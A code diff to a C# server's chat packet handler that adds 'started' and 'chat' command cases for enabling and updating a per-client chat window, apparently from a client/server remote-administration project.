@@ -15,19 +15,39 @@ namespace Server.Handle_Packet
     {
         public HandleChat(MsgPack unpack_msgpack, Clients client)
         {
-            FormChat chat = (FormChat)Application.OpenForms["chat:" + client.ID];
-            if (chat != null)
+            switch (unpack_msgpack.ForcePathObject("Command").GetAsString())
             {
-                Console.Beep();
-                chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
-                chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
-                chat.richTextBox1.ScrollToCaret();
-            }
-            else
-            {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "chatExit";
-                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                case "started":
+                    {
+                        FormChat chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                        if (chat != null)
+                        {
+                            chat.Client = client;
+                            chat.timer1.Start();
+                            chat.textBox1.Enabled = true;
+                            chat.richTextBox1.Enabled = true;
+                        }
+                        break;
+                    }
+
+                case "chat":
+                    {
+                        FormChat chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                        if (chat != null)
+                        {
+                            Console.Beep();
+                            chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
+                            chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
+                            chat.richTextBox1.ScrollToCaret();
+                        }
+                        else
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "chatExit";
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
+                        break;
+                    }
             }
         }
     }
